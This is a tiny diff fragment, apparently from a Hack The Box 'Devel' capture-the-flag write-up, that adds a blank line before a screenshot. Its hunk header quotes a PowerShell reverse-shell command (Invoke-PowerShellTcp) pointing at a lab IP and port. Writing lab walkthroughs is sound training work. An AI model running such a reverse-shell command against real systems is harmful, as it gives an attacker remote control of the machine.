@@ -222,6 +222,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444
 
 ```
 
+
 ![image](https://github.com/gecr07/Devel-HTB/assets/63270579/efb2a3c0-8208-4f8e-a911-8bb0336b5699)
 
 
